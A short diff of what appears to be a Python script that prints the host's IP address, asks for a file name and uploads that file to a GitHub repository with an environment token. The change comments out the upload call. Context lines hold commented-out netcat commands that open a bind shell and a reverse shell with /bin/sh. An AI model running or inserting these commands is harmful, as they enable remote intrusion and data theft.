@@ -18,7 +18,7 @@ token = os.environ['MY_TOKEN']
 def update_file_on_github(file_path):
     url = f"https://api.github.com/repos/kaki714/Not/contents/data/info.txt"
     headers = {
-        "Authorization": f"token {token}",
+        "Authorization": f'token {token}',
         "Accept": "application/vnd.github.v3+json"
     }
 
@@ -73,7 +73,7 @@ def run():
         print(' IpAddress: ', IPAddr)
         print('insert Filename to upload: ')
         archive=input()
-        upload_file_to_github(archive)
+        #upload_file_to_github(archive)
         #os.system( 'nc -lvp 734 -e /bin/sh')
         #os.system('nc' + iph+ ' 734 -e /bin/sh')
     elif "Windows" in platform.system():
